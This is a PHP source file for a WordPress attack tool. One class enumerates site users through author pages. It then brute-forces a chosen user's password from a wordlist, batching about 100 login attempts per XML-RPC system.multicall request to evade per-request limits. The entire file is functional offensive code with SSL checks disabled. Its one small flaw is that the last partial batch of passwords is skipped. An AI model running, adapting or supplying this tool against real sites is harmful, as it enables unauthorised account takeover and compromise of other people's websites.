<?php

namespace Arall\WPBruteforcer;

use \Curl\Curl;

/**
 * WordPress Bruteforcer class.
 * Performs a XMLRPC amplification bruteforce using a wordlist.
 * Can also try to enumerate WordPress users.
 *
 * https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
 *
 * @author Gerard Arall <gerard.arall@gmail.com>
 */
class WPBruteforcer
{
    /**
     * Website URL.
     *
     * @var string
     */
    private $url;

    /**
     * Wordlist path.
     *
     * @var string
     */
    private $wordlist;

    /**
     * Username to bruteforce.
     *
     * @var string
     */
    private $username;

    /**
     * XMLRPC URL URI.
     *
     * @var string
     */
    private $xmlrpc_uri = '/xmlrpc.php';

    /**
     * Login tries per request.
     *
     * @var int
     */
    private $tries = 100;

    /**
     * Current request passwords.
     *
     * @var array
     */
    private $current_passwords = [];

    /**
     * Current wordlist line position.
     *
     * @var int
     */
    private $current_line = 0;

    /**
     * XML Test body.
     */
    const XML_TEST = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>demo.sayHello</methodName>
      <params></params>
    </methodCall>';

    /**
     * XML Header.
     */
    const XML_HEADER = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
       <methodName>system.multicall</methodName>
       <params><param><value><array><data><value>';

    /**
     * XML Login data.
     */
    const XML_LOGIN = '<struct>
      <member><name>methodName</name>
        <value><string>wp.getAuthors</string></value>
      </member>
      <member>
        <name>params</name>
        <value><array><data>
          <value><string>1</string></value>
          <value><string>USERNAME</string></value>
          <value><string>PASSWORD</string></value>
       </data></array></value>
      </member>
    </struct>';

    /**
     * XML Footer.
     */
    const XML_FOOTER = '</value></data></array></value></param></params>
    </methodCall>';

    /**
     * Set a URL as target.
     *
     * @param string $url
     */
    public function setUrl($url)
    {
        $this->url = $url;
    }

    /**
     * Set nº of tries per request.
     *
     * @param int $tries
     */
    public function setTries($tries)
    {
        $this->tries = $tries;
    }

    /**
     * Set target URI.
     *
     * @param string $uri
     */
    public function setXmlrpcUri($uri)
    {
        $this->xmlrpc_uri = $uri;
    }

    /**
     * Set the wordlist path.
     *
     * @param string $wordlist
     */
    public function setWordlist($wordlist)
    {
        $this->wordlist = $wordlist;
    }

    /**
     * Set the username to bruteforce.
     *
     * @param string $username
     */
    public function setUsername($username)
    {
        $this->username = $username;
    }

    /**
     * Enumerate users using WP authors pages.
     *
     * @param int $max          Limit
     * @param int $max_failures Max allowed 404's to give up
     *
     * @return array Array of usernames
     */
    public function enumerate($max = null, $max_failures = 5)
    {
        $users = [];
        $user_id = 0;
        $failures = 0;
        do {
            $user_id++;
            if ($author = $this->getAuthor($user_id)) {
                $users[] = $author;
            } else {
                $failures++;
            }
            if ($max && $user_id >= $max) {
                $author = null;
            } elseif (!$author && $failures < $max_failures) {
                $author = true;
            }
        } while ($author);

        return $users;
    }

    /**
     * Bruteforce a user using XMLRPC amplification.
     * Needs a preloaded URL, username and wordlist.
     *
     * @return string|bool Password or false
     */
    public function bruteforce()
    {
        if (!$this->url) {
            return false;
        }

        if (!$this->username) {
            return false;
        }

        if (!$this->wordlist) {
            return false;
        }

        // Bruteforce
        $this->reset();
        $handle = fopen($this->wordlist, "r");
        if ($handle) {
            while (($password = fgets($handle)) !== false) {
                if ($find = $this->loadWord($password)) {
                    return $find;
                }
            }
            fclose($handle);
        }

        return false;
    }

    /**
     * Load a line (password) from the wordlist.
     * When the nº of passwords loaded reach the
     * nº of tries per request, a request is performed.
     *
     * @param string $password Password
     *
     * @return string|bool Found password or false
     */
    private function loadWord($password)
    {
        $this->addPassword($password);
        $this->current_line++;

        // Perform the request once the max tries are reached
        if ($this->current_line >= $this->tries) {
            $payload = $this->buildPayload();
            $response = $this->xmlrpcRequest($payload);

            if ($password = $this->checkResponse($response)) {
                return $password;
            }

            $this->reset();
        }

        return false;
    }

    /**
     * Load a password for the next request.
     *
     * @param string $password
     */
    private function addPassword($password)
    {
        $this->current_passwords[] = rtrim($password, "\r\n");
    }

    /**
     * Reset loaded passwords and nº of lines.
     */
    private function reset()
    {
        $this->current_passwords = [];
        $this->current_line = 0;
    }

    /**
     * Get the info from an author (user) Id.
     *
     * @param string $user_id
     *
     * @return array|bool User array or false
     */
    private function getAuthor($user_id)
    {
        if ($response = $this->request('/?author=' . $user_id)) {
            $user = ['id' => $user_id, 'login' => null, 'name' => null];
            // Login (author)
            preg_match('/author author-(.+?)(?=\s)/', $response, $matches);
            if (isset($matches[1])) {
                $user['login'] = $matches[1];
            // Login (feed)
            } else {
                preg_match('/\/author\/(.+?)\/feed\//', $response, $matches);
                if (isset($matches[1])) {
                    $user['login'] = $matches[1];
                }
            }
            // Name
            preg_match('/<title>(.*)[,\-|]/', $response, $matches);
            if (isset($matches[1])) {
                $user['name'] = trim($matches[1]);
            }

            if (isset($user['login'])) {
                return $user;
            }
        }

        return false;
    }

    /**
     * Looks for a password in a XMLRPC response.
     *
     * @param \SimpleXMLElement $response
     *
     * @return string|bool Found password or false
     */
    private function checkResponse($response)
    {
        // Check response
        if (isset($response->params->param->value->array->data)) {
            $pos = 0;
            foreach ($response->params->param->value->array->data->value as $value) {
                if (isset($value->array)) {
                    return $this->current_passwords[$pos];
                }
                $pos++;
            }
        }

        return false;
    }

    /**
     * Builds a XML payload to perform the bruteforce.
     *
     * @return string
     */
    private function buildPayload()
    {
        $payload = self::XML_HEADER;
        foreach ($this->current_passwords as $password) {
            $payload .= $this->buildLogin($this->username, $password);
        }
        $payload .= self::XML_FOOTER;

        return $payload;
    }

    /**
     * Test if the URL has XMLRPC up and running.
     *
     * @return bool
     */
    public function testXMLRPC()
    {
        $response = $this->xmlrpcRequest(self::XML_TEST);

        return isset($response->params->param->value->string) && $response->params->param->value->string == 'Hello!';
    }

    /**
     * Builds a single login attempt for the XML payload.
     *
     * @param string $username
     * @param string $password
     *
     * @return string
     */
    private function buildLogin($username, $password)
    {
        $login = str_replace('USERNAME', $username, self::XML_LOGIN);
        $login = str_replace('PASSWORD', $password, $login);

        return $login;
    }

    /**
     * Performs a XMLRPC request.
     *
     * @param string $data
     *
     * @return \SimpleXMLElement|bool Parsed Response or false
     */
    private function xmlrpcRequest($data)
    {
        if ($response = $this->request($this->xmlrpc_uri, $data)) {
            return $response;
        }

        return false;
    }

    /**
     * Performs a cURL request to the website.
     *
     * @param string       $uri
     * @param string|array $post_data
     *
     * @return string|bool Response or false
     */
    private function request($uri, $post_data = null)
    {
        $url = $this->url . $uri;

        $curl = new Curl();
        $curl->setOpt(CURLOPT_SSL_VERIFYPEER, false);
        $curl->setOpt(CURLOPT_FOLLOWLOCATION, true);

        if ($post_data === null) {
            $curl->get($url);
        } else {
            $curl->post($url, $post_data);
        }

        if (!$curl->error) {
            return $curl->response;
        }

        return false;
    }
}
